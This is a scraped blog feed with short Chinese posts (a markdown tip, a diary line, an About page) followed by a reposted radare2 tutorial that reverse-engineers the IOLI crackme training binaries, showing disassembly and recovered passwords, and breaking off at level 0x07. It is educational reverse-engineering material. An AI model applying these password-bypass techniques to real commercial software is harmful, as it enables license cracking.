torurial](http://laravel-china.org/docs/laravel/5.5/)[codeforces][1][1]http://codeforces.com/ //这是引入式写法 插入图片 Demo： Code：1![稻城](https://github.com/Explainaur/dyf_Blog/blob/master/images/a.jpg?raw=true) 上传照片需要图床，可用github当图床，语法格式与链接一致。 到这里差不多就说完了，还有流程图和时序图没有讲，因为我的模板不兼容。 Ps：写道插入图片的时候我在听canon，这是世界上最好听的曲子，突然想起了和我一起去稻城亚丁的两个傻子。]]></content>
      <categories>
        <category>tutorial</category>
      </categories>
      <tags>
        <tag>tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[my world]]></title>
    <url>%2F2018%2F12%2F02%2Fmy-world%2F</url>
    <content type="text"><![CDATA[公元 2018.10.24 1:16 从现在开始,我要记录这精彩的世界]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>solo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[About]]></title>
    <url>%2Fabout%2Findex.html</url>
    <content type="text"><![CDATA[与自己的对白 &emsp;&emsp;计算机爱好者，猫咪爱好者，热爱计算机安全，极端硬核玩家。 I will be a master. 2019.8.26&emsp;&emsp;新学期要开始了,本学期计划: 学英语,准备Toelf ! (感觉要咕咕咕qaq 读完 Computer Systems 并完成实验 实现一个shell 实现一个malloc (这个好难qaq) 阅读 自己动手写CPU 并动手实现 阅读ptmalloc源码 &emsp;&emsp;最近身体也不太好,坚决不再熬夜,每天要去操场上玩一会 &emsp;&emsp;不要再过分紧张,脚踏实地学底层,终有一天会成为Computer Artist 呜呜…想学的东西好多qaq 只能有所取舍了 加油!]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ffile%2Fbin-linux%2Fdefeating-IOLI-with-radare2.html</url>
    <content type="text"><![CDATA[This blogpost is a revival of a collection of ancients one.I was too lazy to port them from wordpress to pelican.But TDKPS asked me if I couldput them back online, since he used them to teach radare2’s basics. Enjoy a completely rewritten reverse-engeenering tutorial proudlypowered by radare2 ! Grab radare2, an asm cheat sheet,the IOLI crackme suite, and geat ready. crackme 0x00This is the first crackme, the easiest one. $ ./crackme0x00 OLI Crackme Level 0x00 Password: 1234 Invalid Password! Maybe the password is in plain text inside it.No need to disassemble here, we’ll just use rabin2, the“binary program info extractor” from radare2. The rabin2’s option to show strings contained in a binary is _-z_ (man rabin2) $ rabin2 -z ./crackme0x00 [strings] addr=0x08048568 off=0x00000568 ordinal=000 sz=24 section=.rodata string=IOLICrackmeLevel0x00 addr=0x08048581 off=0x00000581 ordinal=001 sz=11 section=.rodata string=Password addr=0x0804858f off=0x0000058f ordinal=002 sz=7 section=.rodata string=250382 addr=0x08048596 off=0x00000596 ordinal=003 sz=18 section=.rodata string=InvalidPassword! addr=0x080485a9 off=0x000005a9 ordinal=004 sz=15 section=.rodata string=PasswordOK 5 strings What is 250382 ? $ ./crackme0x00 IOLI Crackme Level 0x00 Password: 250382 Password OK :) crackme0x01This time, no luck with rabin2 -z.Let’s check with radare2. $ r2 ./crackme0x01 [0x08048330]&gt; aa [0x08048330]&gt; pdf@sym.main / function: sym.main (113) | 0x080483e4 sym.main: | 0x080483e4 55 push ebp | 0x080483e5 89e5 mov ebp, esp | 0x080483e7 83ec18 sub esp, 0x18 | 0x080483ea 83e4f0 and esp, 0xfffffff0 | 0x080483ed b800000000 mov eax, 0x0 | 0x080483f2 83c00f add eax, 0xf | 0x080483f5 83c00f add eax, 0xf | 0x080483f8 c1e804 shr eax, 0x4 | 0x080483fb c1e004 shl eax, 0x4 | 0x080483fe 29c4 sub esp, eax | 0x08048400 c7042428850408 mov dword [esp], str.IOLICrackmeLevel0x01 | 0x08048407 e810ffffff call dword imp.printf | ; imp.printf() | 0x0804840c c7042441850408 mov dword [esp], str.Password | 0x08048413 e804ffffff call dword imp.printf | ; imp.printf() | 0x08048418 8d45fc lea eax, [ebp-0x4] | 0x0804841b 89442404 mov [esp+0x4], eax | 0x0804841f c704244c850408 mov dword [esp], 0x804854c | 0x08048426 e8e1feffff call dword imp.scanf | ; imp.scanf() | 0x0804842b 817dfc9a140000 cmp dword [ebp-0x4], 0x149a | ,=&lt; 0x08048432 740e jz loc.08048442 | | 0x08048434 c704244f850408 mov dword [esp], str.InvalidPassword! | | 0x0804843b e8dcfeffff call dword imp.printf | | ; imp.printf() | ,==&lt; 0x08048440 eb0c jmp loc.0804844e | || ; CODE (JMP) XREF 0x08048432 (sym.main) / loc: loc.08048442 (19) | || 0x08048442 loc.08048442: | |`-&gt; 0x08048442 c7042462850408 mov dword [esp], str.PasswordOK | | 0x08048449 e8cefeffff call dword imp.printf | | ; imp.printf() | | ; CODE (JMP) XREF 0x08048440 (sym.main) / loc: loc.0804844e (7) | | 0x0804844e loc.0804844e: | `--&gt; 0x0804844e b800000000 mov eax, 0x0 | 0x08048453 c9 leave \ 0x08048454 c3 ret The “aa” commands tells r2 to analyse the whole binary. This will get you nice symbols names and fancy stuffs.“pdf” stands for print disassemble function So, this will print the disassembly of sym.main function, aka the main() that every one knows.Back to the listing, you can see several stuffs: weird names, arrows, … imp. stands for imports. Those are imported symbols, like printf() str. stands for strings. Those are strings (no shit !). If you look carefully, you’ll see a cmp instruction, with a constant: 0x149a.The “0x” in front of it indicates that it’s in base 16. You can use radare2’s to get itin another base: [0x08048330]&gt; ? 0x149a 5274 0x149a 012232 10011010 0.000000 Ok, 0x149a is 5274. $ ./crackme0x01 IOLI Crackme Level 0x01 Password: 5274 Password OK :) crackme0x03aa pdf@sym.main / function: sym.main (128) | 0x08048498 sym.main: | 0x08048498 55 push ebp | 0x08048499 89e5 mov ebp, esp | 0x0804849b 83ec18 sub esp, 0x18 | 0x0804849e 83e4f0 and esp, 0xfffffff0 | 0x080484a1 b800000000 mov eax, 0x0 | 0x080484a6 83c00f add eax, 0xf | 0x080484a9 83c00f add eax, 0xf | 0x080484ac c1e804 shr eax, 0x4 | 0x080484af c1e004 shl eax, 0x4 | 0x080484b2 29c4 sub esp, eax | 0x080484b4 c7042410860408 mov dword [esp], str.IOLICrackmeLevel0x03 | 0x080484bb e890feffff call dword imp.printf | ; imp.printf() | 0x080484c0 c7042429860408 mov dword [esp], str.Password | 0x080484c7 e884feffff call dword imp.printf | ; imp.printf() | 0x080484cc 8d45fc lea eax, [ebp-0x4] | 0x080484cf 89442404 mov [esp+0x4], eax | 0x080484d3 c7042434860408 mov dword [esp], 0x8048634 | 0x080484da e851feffff call dword imp.scanf | ; imp.scanf() | 0x080484df c745f85a000000 mov dword [ebp-0x8], 0x5a | 0x080484e6 c745f4ec010000 mov dword [ebp-0xc], 0x1ec | 0x080484ed 8b55f4 mov edx, [ebp-0xc] ; edx = 0x1ec | 0x080484f0 8d45f8 lea eax, [ebp-0x8] ; eax -&gt; ebp-0x8 | 0x080484f3 0110 add [eax], edx ; ebp-0x8 = (0x5a + 0x1ec) | 0x080484f5 8b45f8 mov eax, [ebp-0x8] ; eax = 0x5a + 0x1ec = 0x246 | 0x080484f8 0faf45f8 imul eax, [ebp-0x8] ; eax = 0x246 * 0x246 = 0x52b24 | 0x080484fc 8945f4 mov [ebp-0xc], eax ; ebp-0xc = 0x52b24 | 0x080484ff 8b45f4 mov eax, [ebp-0xc] ; eax = 0x52b24 | 0x08048502 89442404 mov [esp+0x4], eax ; esp+0x4 = eax | 0x08048506 8b45fc mov eax, [ebp-0x4] | 0x08048509 890424 mov [esp], eax | 0x0804850c e85dffffff call dword sym.test | ; sym.test() | 0x08048511 b800000000 mov eax, 0x0 | 0x08048516 c9 leave \ 0x08048517 c3 ret ; ------------ Ho, a call to a interesting function: sym.test, called with two parameters:Likely our password, and 0x52b24 (or 338724 if you prefer). pdf@sym.test ; CODE (CALL) XREF 0x0804850c (sym.main) / function: sym.test (42) | 0x0804846e sym.test: | 0x0804846e 55 push ebp | 0x0804846f 89e5 mov ebp, esp | 0x08048471 83ec08 sub esp, 0x8 | 0x08048474 8b4508 mov eax, [ebp+0x8] | 0x08048477 3b450c cmp eax, [ebp+0xc] | ,=&lt; 0x0804847a 740e jz loc.0804848a | | 0x0804847c c70424ec850408 mov dword [esp], str.LqydolgSdvvzrug$ | | 0x08048483 e88cffffff call dword sym.shift | | ; sym.shift(unk) | ,==&lt; 0x08048488 eb0c jmp loc.08048496 | || ; CODE (JMP) XREF 0x0804847a (sym.test) / loc: loc.0804848a (14) | || 0x0804848a loc.0804848a: | |`-&gt; 0x0804848a c70424fe850408 mov dword [esp], str.SdvvzrugRN$$$=, | | 0x08048491 e87effffff call dword sym.shift | | ; sym.shift() | | ; CODE (JMP) XREF 0x08048488 (sym.test) / loc: loc.08048496 (2) | | 0x08048496 loc.08048496: | `--&gt; 0x08048496 c9 leave \ 0x08048497 c3 ret And now, you should must be lazy. There is a cmp, and two path,with mangled strings. This seems to be a goodboy/badboy. $ ./crackme0x03 IOLI Crackme Level 0x03 Password: 338724 Password OK!!! :) You can also reverse the sym.shift function: [0x08048360]&gt; pdf@sym.shift ; CODE (CALL) XREF 0x08048491 (sym.test) ; CODE (CALL) XREF 0x08048483 (sym.test) / function: sym.shift (90) | 0x08048414 sym.shift: | 0x08048414 55 push ebp | 0x08048415 89e5 mov ebp, esp | 0x08048417 81ec98000000 sub esp, 0x98 | 0x0804841d c7458400000000 mov dword [ebp-0x7c], 0x0 ; this seems to be a counter | . ; CODE (JMP) XREF 0x0804844e (sym.shift) / loc: loc.08048424 (74) | . 0x08048424 loc.08048424: | .--&gt; 0x08048424 8b4508 mov eax, [ebp+0x8] ; ebp+0x8 = strlen(chain) | | 0x08048427 890424 mov [esp], eax | | 0x0804842a e811ffffff call dword imp.strlen | | ; imp.strlen() | | 0x0804842f 394584 cmp [ebp-0x7c], eax | |,=&lt; 0x08048432 731c jae loc.08048450 | || 0x08048434 8d4588 lea eax, [ebp-0x78] | || 0x08048437 89c2 mov edx, eax | || 0x08048439 035584 add edx, [ebp-0x7c] | || 0x0804843c 8b4584 mov eax, [ebp-0x7c] | || 0x0804843f 034508 add eax, [ebp+0x8] | || 0x08048442 0fb600 movzx eax, byte [eax] | || 0x08048445 2c03 sub al, 0x3 | || 0x08048447 8802 mov [edx], al | || 0x08048449 8d4584 lea eax, [ebp-0x7c] | || 0x0804844c ff00 inc dword [eax] | `==&lt; 0x0804844e ebd4 jmp loc.08048424 | | ; CODE (JMP) XREF 0x08048432 (sym.shift) / loc: loc.08048450 (30) | | 0x08048450 loc.08048450: | `-&gt; 0x08048450 8d4588 lea eax, [ebp-0x78] | 0x08048453 034584 add eax, [ebp-0x7c] | 0x08048456 c60000 mov byte [eax], 0x0 | 0x08048459 8d4588 lea eax, [ebp-0x78] | 0x0804845c 89442404 mov [esp+0x4], eax | 0x08048460 c70424e8850408 mov dword [esp], 0x80485e8 | 0x08048467 e8e4feffff call dword imp.printf | ; imp.printf() | 0x0804846c c9 leave \ 0x0804846d c3 ret ; ------------ A strlen, a comparison to a counter, … This looks like a (simple) decryption loop !And the only operation done is actually a “”dec 0x3”. Since this function is named shift,this seems plausible. Let’s check with some Python: :::python print &apos;&apos;.join([chr(ord(i)-0x3) for i in &apos;SdvvzrugRN$$$&apos;]) PasswordOK!!! print &apos;&apos;.join([chr(ord(i)-0x3) for i in &apos;LqydolgSdvvzrug$&apos;]) InvalidPassword! Woohoo, we where right. crackme0x04[0x080483d0]&gt; aa [0x080483d0]&gt; pdf@sym.main / function: sym.main (92) | 0x08048509 sym.main: | 0x08048509 55 push ebp | 0x0804850a 89e5 mov ebp, esp | 0x0804850c 81ec88000000 sub esp, 0x88 | 0x08048512 83e4f0 and esp, 0xfffffff0 | 0x08048515 b800000000 mov eax, 0x0 | 0x0804851a 83c00f add eax, 0xf | 0x0804851d 83c00f add eax, 0xf | 0x08048520 c1e804 shr eax, 0x4 | 0x08048523 c1e004 shl eax, 0x4 | 0x08048526 29c4 sub esp, eax | 0x08048528 c704245e860408 mov dword [esp], str.IOLICrackmeLevel0x04 | 0x0804852f e860feffff call dword imp.printf | ; imp.printf() | 0x08048534 c7042477860408 mov dword [esp], str.Password | 0x0804853b e854feffff call dword imp.printf | ; imp.printf() | 0x08048540 8d4588 lea eax, [ebp-0x78] | 0x08048543 89442404 mov [esp+0x4], eax | 0x08048547 c7042482860408 mov dword [esp], 0x8048682 | 0x0804854e e821feffff call dword imp.scanf | ; imp.scanf() | 0x08048553 8d4588 lea eax, [ebp-0x78] | 0x08048556 890424 mov [esp], eax | 0x08048559 e826ffffff call dword sym.check | ; sym.check() | 0x0804855e b800000000 mov eax, 0x0 | 0x08048563 c9 leave \ 0x08048564 c3 ret ; ------------ Nothing funky nor new. [0x080483d0]&gt; pdf@sym.check ; CODE (CALL) XREF 0x08048559 (sym.main) / function: sym.check (133) | 0x08048484 sym.check: | 0x08048484 55 push ebp | 0x08048485 89e5 mov ebp, esp | 0x08048487 83ec28 sub esp, 0x28 | 0x0804848a c745f800000000 mov dword [ebp-0x8], 0x0 ; smells like those lines | 0x08048491 c745f400000000 mov dword [ebp-0xc], 0x0 ; are counters ! | . ; CODE (JMP) XREF 0x080484f9 (sym.check) / loc: loc.08048498 (113) | . 0x08048498 loc.08048498: | .---&gt; 0x08048498 8b4508 mov eax, [ebp+0x8] | | 0x0804849b 890424 mov [esp], eax | | 0x0804849e e8e1feffff call dword imp.strlen | | ; imp.strlen() | | 0x080484a3 3945f4 cmp [ebp-0xc], eax ; counter &gt; strlen ? | | ,=&lt; 0x080484a6 7353 jae loc.080484fb ; if yes, jumps to badboy | | | 0x080484a8 8b45f4 mov eax, [ebp-0xc] | | | 0x080484ab 034508 add eax, [ebp+0x8] | | | 0x080484ae 0fb600 movzx eax, byte [eax] | | | 0x080484b1 8845f3 mov [ebp-0xd], al | | | 0x080484b4 8d45fc lea eax, [ebp-0x4] | | | 0x080484b7 89442408 mov [esp+0x8], eax | | | 0x080484bb c744240438860408 mov dword [esp+0x4], 0x8048638 ; what is that ? | | | 0x080484c3 8d45f3 lea eax, [ebp-0xd] | | | 0x080484c6 890424 mov [esp], eax | | | 0x080484c9 e8d6feffff call dword imp.sscanf | | | ; imp.sscanf() | | | 0x080484ce 8b55fc mov edx, [ebp-0x4] ; edx = scanf()&apos;s result | | | 0x080484d1 8d45f8 lea eax, [ebp-0x8] | | | 0x080484d4 0110 add [eax], edx ; ebp-0x8 is incremented | | | 0x080484d6 837df80f cmp dword [ebp-0x8], 0xf ; and compared to 0xf | |,==&lt; 0x080484da 7518 jnz loc.080484f4 ; if not equals, jump ! | ||| 0x080484dc c704243b860408 mov dword [esp], str.PasswordOK! | ||| 0x080484e3 e8acfeffff call dword imp.printf | ||| ; imp.printf() | ||| 0x080484e8 c7042400000000 mov dword [esp], 0x0 | ||| 0x080484ef e8c0feffff call dword imp.exit | ||| ; imp.exit() | || ; CODE (JMP) XREF 0x080484da (sym.check) / loc: loc.080484f4 (21) | || 0x080484f4 loc.080484f4: | |`--&gt; 0x080484f4 8d45f4 lea eax, [ebp-0xc] | | | 0x080484f7 ff00 inc dword [eax] | `===&lt; 0x080484f9 eb9d jmp loc.08048498 | | ; CODE (JMP) XREF 0x080484a6 (sym.check) / loc: loc.080484fb (14) | | 0x080484fb loc.080484fb: | `-&gt; 0x080484fb c7042449860408 mov dword [esp], str.PasswordIncorrect! | 0x08048502 e88dfeffff call dword imp.printf | ; imp.printf() | 0x08048507 c9 leave \ 0x08048508 c3 ret ; ------------ Strlen again, a loop, scanf, … What is send to scanf ? [0x080483d0]&gt; s 0x8048638 [0x08048638]&gt; ps %d [0x08048638]&gt; This seems to be some kind of atoi(), but with scanf().So, our password’s sum must be equals to 0xf (aka 15) at some point. $ ./crackme0x04 IOLI Crackme Level 0x04 Password: 96 Password OK! crackme0x05[0x080483d0]&gt; aa [0x080483d0]&gt; pdf@sym.main / function: sym.main (92) | 0x08048540 sym.main: | 0x08048540 55 push ebp | 0x08048541 89e5 mov ebp, esp | 0x08048543 81ec88000000 sub esp, 0x88 | 0x08048549 83e4f0 and esp, 0xfffffff0 | 0x0804854c b800000000 mov eax, 0x0 | 0x08048551 83c00f add eax, 0xf | 0x08048554 83c00f add eax, 0xf | 0x08048557 c1e804 shr eax, 0x4 | 0x0804855a c1e004 shl eax, 0x4 | 0x0804855d 29c4 sub esp, eax | 0x0804855f c704248e860408 mov dword [esp], str.IOLICrackmeLevel0x05 | 0x08048566 e829feffff call dword imp.printf | ; imp.printf() | 0x0804856b c70424a7860408 mov dword [esp], str.Password | 0x08048572 e81dfeffff call dword imp.printf | ; imp.printf() | 0x08048577 8d4588 lea eax, [ebp-0x78] | 0x0804857a 89442404 mov [esp+0x4], eax | 0x0804857e c70424b2860408 mov dword [esp], 0x80486b2 | 0x08048585 e8eafdffff call dword imp.scanf | ; imp.scanf() | 0x0804858a 8d4588 lea eax, [ebp-0x78] | 0x0804858d 890424 mov [esp], eax | 0x08048590 e833ffffff call dword sym.check | ; sym.check() | 0x08048595 b800000000 mov eax, 0x0 | 0x0804859a c9 leave \ 0x0804859b c3 ret ; ------------ Boring. [0x080483d0]&gt; pdf@sym.check ; CODE (CALL) XREF 0x08048590 (sym.main) / function: sym.check (120) | 0x080484c8 sym.check: | 0x080484c8 55 push ebp | 0x080484c9 89e5 mov ebp, esp | 0x080484cb 83ec28 sub esp, 0x28 | 0x080484ce c745f800000000 mov dword [ebp-0x8], 0x0 | 0x080484d5 c745f400000000 mov dword [ebp-0xc], 0x0 | . ; CODE (JMP) XREF 0x08048530 (sym.check) / loc: loc.080484dc (100) | . 0x080484dc loc.080484dc: | .---&gt; 0x080484dc 8b4508 mov eax, [ebp+0x8] | | 0x080484df 890424 mov [esp], eax | | 0x080484e2 e89dfeffff call dword imp.strlen | | ; imp.strlen() | | 0x080484e7 3945f4 cmp [ebp-0xc], eax | | ,=&lt; 0x080484ea 7346 jae loc.08048532 | | | 0x080484ec 8b45f4 mov eax, [ebp-0xc] | | | 0x080484ef 034508 add eax, [ebp+0x8] | | | 0x080484f2 0fb600 movzx eax, byte [eax] | | | 0x080484f5 8845f3 mov [ebp-0xd], al | | | 0x080484f8 8d45fc lea eax, [ebp-0x4] | | | 0x080484fb 89442408 mov [esp+0x8], eax | | | 0x080484ff c744240468860408 mov dword [esp+0x4], 0x8048668 | | | 0x08048507 8d45f3 lea eax, [ebp-0xd] | | | 0x0804850a 890424 mov [esp], eax | | | 0x0804850d e892feffff call dword imp.sscanf | | | ; imp.sscanf() | | | 0x08048512 8b55fc mov edx, [ebp-0x4] | | | 0x08048515 8d45f8 lea eax, [ebp-0x8] | | | 0x08048518 0110 add [eax], edx | | | 0x0804851a 837df810 cmp dword [ebp-0x8], 0x10 | |,==&lt; 0x0804851e 750b jnz loc.0804852b | ||| 0x08048520 8b4508 mov eax, [ebp+0x8] | ||| 0x08048523 890424 mov [esp], eax | ||| 0x08048526 e859ffffff call dword sym.parell | ||| ; sym.parell() | || ; CODE (JMP) XREF 0x0804851e (sym.check) / loc: loc.0804852b (21) | || 0x0804852b loc.0804852b: | |`--&gt; 0x0804852b 8d45f4 lea eax, [ebp-0xc] | | | 0x0804852e ff00 inc dword [eax] | `===&lt; 0x08048530 ebaa jmp loc.080484dc | | ; CODE (JMP) XREF 0x080484ea (sym.check) / loc: loc.08048532 (14) | | 0x08048532 loc.08048532: | `-&gt; 0x08048532 c7042479860408 mov dword [esp], str.PasswordIncorrect! | 0x08048539 e856feffff call dword imp.printf | ; imp.printf() | 0x0804853e c9 leave \ 0x0804853f c3 ret ; ------------ Same function as the previous crackme, but this time, it’s not compared to 15, but to 16.And instead of a printf(“Password OK!”), there is a call to sym.pharell [0x080483d0]&gt; pdf@sym.parell ; CODE (CALL) XREF 0x08048526 (sym.check) / function: sym.parell (68) | 0x08048484 sym.parell: | 0x08048484 55 push ebp | 0x08048485 89e5 mov ebp, esp | 0x08048487 83ec18 sub esp, 0x18 | 0x0804848a 8d45fc lea eax, [ebp-0x4] | 0x0804848d 89442408 mov [esp+0x8], eax | 0x08048491 c744240468860408 mov dword [esp+0x4], 0x8048668 | 0x08048499 8b4508 mov eax, [ebp+0x8] | 0x0804849c 890424 mov [esp], eax | 0x0804849f e800ffffff call dword imp.sscanf | ; imp.sscanf() | 0x080484a4 8b45fc mov eax, [ebp-0x4] | 0x080484a7 83e001 and eax, 0x1 | 0x080484aa 85c0 test eax, eax | ,=&lt; 0x080484ac 7518 jnz loc.080484c6 | | 0x080484ae c704246b860408 mov dword [esp], str.PasswordOK! | | 0x080484b5 e8dafeffff call dword imp.printf | | ; imp.printf() | | 0x080484ba c7042400000000 mov dword [esp], 0x0 | | 0x080484c1 e8eefeffff call dword imp.exit | | ; imp.exit() | | ; CODE (JMP) XREF 0x080484ac (sym.parell) / loc: loc.080484c6 (2) | | 0x080484c6 loc.080484c6: | `-&gt; 0x080484c6 c9 leave \ 0x080484c7 c3 ret ; ------------ Another scanf(), used as an atoi(). It’s return value is and’ed with 1,and if the result is 0, goodboy ! As everyone knows, and’ing with 1 is thesame as testing is the number is odd. $ ./crackme0x05 IOLI Crackme Level 0x05 Password: 664 Password OK! crackme0x06pdf@sym.main / function: sym.main (99) | 0x08048607 sym.main: | 0x08048607 55 push ebp | 0x08048608 89e5 mov ebp, esp | 0x0804860a 81ec88000000 sub esp, 0x88 | 0x08048610 83e4f0 and esp, 0xfffffff0 | 0x08048613 b800000000 mov eax, 0x0 | 0x08048618 83c00f add eax, 0xf | 0x0804861b 83c00f add eax, 0xf | 0x0804861e c1e804 shr eax, 0x4 | 0x08048621 c1e004 shl eax, 0x4 | 0x08048624 29c4 sub esp, eax | 0x08048626 c7042463870408 mov dword [esp], str.IOLICrackmeLevel0x06 | 0x0804862d e886fdffff call dword imp.printf | ; imp.printf() | 0x08048632 c704247c870408 mov dword [esp], str.Password | 0x08048639 e87afdffff call dword imp.printf | ; imp.printf() | 0x0804863e 8d4588 lea eax, [ebp-0x78] | 0x08048641 89442404 mov [esp+0x4], eax | 0x08048645 c7042487870408 mov dword [esp], 0x8048787 | 0x0804864c e847fdffff call dword imp.scanf | ; imp.scanf() | 0x08048651 8b4510 mov eax, [ebp+0x10] | 0x08048654 89442404 mov [esp+0x4], eax | 0x08048658 8d4588 lea eax, [ebp-0x78] | 0x0804865b 890424 mov [esp], eax | 0x0804865e e825ffffff call dword sym.check | ; sym.check() | 0x08048663 b800000000 mov eax, 0x0 | 0x08048668 c9 leave \ 0x08048669 c3 ret ; ------------ Blablabla, same stuff than previously, blablabla.Or is it ?Check again. You can see that this time, the sym.check function takes 2 parameters. The result of scanf(), ([ebp-0x78]) in esp [ebp+10] in [esp+0x4] Since main() is a function, and this code is compiled with GCC,you can expect a stack like this: [esp + 0x10] - envp [esp + 0x0c] - argv [esp + 0x08] - argc [esp + 0x04] - return address So, our sym.check call looks like: check(int password, char* argv[]); Except this, the code is the same that the previous binary (except that envp is passed as an argument) for sym.main, sym.check, sym.parell, …Or it is ?Check once again ;)The code is different in sym.parell.You can notice a call to sym.dummy. [0x08048400]&gt; pdf@sym.dummy ; CODE (CALL) XREF 0x08048547 (sym.parell) / function: sym.dummy (102) | 0x080484b4 sym.dummy: | 0x080484b4 55 push ebp | 0x080484b5 89e5 mov ebp, esp | 0x080484b7 83ec18 sub esp, 0x18 | 0x080484ba c745fc00000000 mov dword [ebp-0x4], 0x0 | . ; CODE (JMP) XREF 0x08048503 (sym.dummy) / loc: loc.080484c1 (89) | . 0x080484c1 loc.080484c1: | .--&gt; 0x080484c1 8b45fc mov eax, [ebp-0x4] | | 0x080484c4 8d148500000000 lea edx, [eax*4+0x0] | | 0x080484cb 8b450c mov eax, [ebp+0xc] | | 0x080484ce 833c0200 cmp dword [edx+eax], 0x0 | |,=&lt; 0x080484d2 743a jz loc.0804850e | || 0x080484d4 8b45fc mov eax, [ebp-0x4] | || 0x080484d7 8d0c8500000000 lea ecx, [eax*4+0x0] | || 0x080484de 8b550c mov edx, [ebp+0xc] | || 0x080484e1 8d45fc lea eax, [ebp-0x4] | || 0x080484e4 ff00 inc dword [eax] | || 0x080484e6 c744240803000000 mov dword [esp+0x8], 0x3 | || 0x080484ee c744240438870408 mov dword [esp+0x4], str.LOLO | || 0x080484f6 8b0411 mov eax, [ecx+edx] | || 0x080484f9 890424 mov [esp], eax | || 0x080484fc e8d7feffff call dword imp.strncmp | || ; imp.strncmp() | || 0x08048501 85c0 test eax, eax | `==&lt; 0x08048503 75bc jnz loc.080484c1 | | 0x08048505 c745f801000000 mov dword [ebp-0x8], 0x1 | ,===&lt; 0x0804850c eb07 jmp loc.08048515 | | | ; CODE (JMP) XREF 0x080484d2 (sym.dummy) / loc: loc.0804850e (12) | | | 0x0804850e loc.0804850e: | | `-&gt; 0x0804850e c745f800000000 mov dword [ebp-0x8], 0x0 | | ; CODE (JMP) XREF 0x0804850c (sym.dummy) / loc: loc.08048515 (5) | | 0x08048515 loc.08048515: | `---&gt; 0x08048515 8b45f8 mov eax, [ebp-0x8] | 0x08048518 c9 leave \ 0x08048519 c3 ret ; ------------ Let’s be clever lazy once again: str.LOLO strncmp() no new input/output compared to the previous binary the environnement pointer is passed form sym.main to sym.check to sym.parell … Looks like the binary wants the same things that the previous one, plus an environnement variable named “LOLO”. $ LOLO= ./crackme0x06 IOLI Crackme Level 0x06 Password: 556 Password OK! Maybe you asked yourself “How the hell am I supposed to recognize that this is GDB’s output ?!”.By experience.But, there is another way: $ rabin2 -S ./crackme0x06 [Sections] idx=00 addr=0x08048000 off=0x00000000 sz=0 vsz=0 perm=---- name= idx=01 addr=0x08048154 off=0x00000154 sz=19 vsz=19 perm=-r-- name=.interp idx=02 addr=0x08048168 off=0x00000168 sz=32 vsz=32 perm=-r-- name=.note.ABItag idx=03 addr=0x08048188 off=0x00000188 sz=60 vsz=60 perm=-r-- name=.hash idx=04 addr=0x080481c4 off=0x000001c4 sz=32 vsz=32 perm=-r-- name=.gnu.hash idx=05 addr=0x080481e4 off=0x000001e4 sz=160 vsz=160 perm=-r-- name=.dynsym idx=06 addr=0x08048284 off=0x00000284 sz=103 vsz=103 perm=-r-- name=.dynstr idx=07 addr=0x080482ec off=0x000002ec sz=20 vsz=20 perm=-r-- name=.gnu.version idx=08 addr=0x08048300 off=0x00000300 sz=32 vsz=32 perm=-r-- name=.gnu.version_r idx=09 addr=0x08048320 off=0x00000320 sz=8 vsz=8 perm=-r-- name=.rel.dyn idx=10 addr=0x08048328 off=0x00000328 sz=56 vsz=56 perm=-r-- name=.rel.plt idx=11 addr=0x08048360 off=0x00000360 sz=23 vsz=23 perm=-r-x name=.init idx=12 addr=0x08048378 off=0x00000378 sz=128 vsz=128 perm=-r-x name=.plt idx=13 addr=0x08048400 off=0x00000400 sz=788 vsz=788 perm=-r-x name=.text idx=14 addr=0x08048714 off=0x00000714 sz=26 vsz=26 perm=-r-x name=.fini idx=15 addr=0x08048730 off=0x00000730 sz=90 vsz=90 perm=-r-- name=.rodata idx=16 addr=0x0804878c off=0x0000078c sz=4 vsz=4 perm=-r-- name=.eh_frame idx=17 addr=0x08049f0c off=0x00000f0c sz=8 vsz=8 perm=-rw- name=.ctors idx=18 addr=0x08049f14 off=0x00000f14 sz=8 vsz=8 perm=-rw- name=.dtors idx=19 addr=0x08049f1c off=0x00000f1c sz=4 vsz=4 perm=-rw- name=.jcr idx=20 addr=0x08049f20 off=0x00000f20 sz=208 vsz=208 perm=-rw- name=.dynamic idx=21 addr=0x08049ff0 off=0x00000ff0 sz=4 vsz=4 perm=-rw- name=.got idx=22 addr=0x08049ff4 off=0x00000ff4 sz=40 vsz=40 perm=-rw- name=.got.plt idx=23 addr=0x0804a01c off=0x0000101c sz=12 vsz=12 perm=-rw- name=.data idx=24 addr=0x0804a028 off=0x00001028 sz=4 vsz=4 perm=-rw- name=.bss idx=25 addr=0x08049028 off=0x00001028 sz=441 vsz=441 perm=---- name=.comment idx=26 addr=0x080491e1 off=0x000011e1 sz=219 vsz=219 perm=---- name=.shstrtab idx=27 addr=0x08049744 off=0x00001744 sz=1152 vsz=1152 perm=---- name=.symtab idx=28 addr=0x08049bc4 off=0x00001bc4 sz=609 vsz=609 perm=---- name=.strtab 29 sections Since this binary is not stripped (man strip), you can notice a “.comment” section. $ r2 ./crackme0x06 [0x08048400]&gt; s section..comment [0x08049028]&gt; ps 128 \x00GCC: (GNU) 3.4.6 (Gentoo 3.4.6-r2, ssp-3.4.6-1.0, pie-8.7.10)\x00\x00GCC: (GNU) 3.4.6 (Gentoo 3.4.6-r2, ssp-3.4.6-1.0, pie-8.7.10)\x00\x00G Yay, GCC 3.4.6 on a Gentoo 3.4.6-r2 ! crackme0x07[0x08048400]&gt; aa [0x08048400]&gt; pdf / function: section..text (34) | 0x08048400 section..text: | 0x08048400 31ed xor ebp, ebp ; [13] va=0x08048400 pa=0x00000400 sz=900 vsz=900 rwx=-r-x .text | 0x08048402 5e pop esi | 0x08048403 89e1 mov ecx, esp | 0x08048405 83e4f0 and esp, 0xfffffff0 | 0x08048408 50 push eax | 0x08048409 54 push esp | 0x0804840a 52 push edx | 0x0804840b 6850870408 push dword 0x8048750 | 0x08048410 68e0860408 push dword 0x80486e0 | 0x08048415 51 push ecx | 0x08048416 56 push esi | 0x08048417 687d860408 push dword 0x804867d | 0x0804841c e867ffffff call dword imp.__libc_start_main | ; imp.__libc_start_main() \ 0x08048421 f4 hlt ; ------------ wat.What happened to symbols ?! $ rabin2 -I ./crackme0x07 [File info] File=/home/jvoisin/dev/reverse/crackme/done/IOLI-crackme/bin-linux/./crackme0x07 Type=EXEC (Executable file) HasVA=true RootClass=elf Class=ELF32 Arch=x86 32 Machine=Intel 80386 OS=linux Subsystem=linux Big endian=false Stripped=true Static=false Line_nums=false Local_syms=false Relocs=false RPath=NONE This binary is stripped : no more symbols. Since this is GCC-produced code, the main is likely at 0x804867d 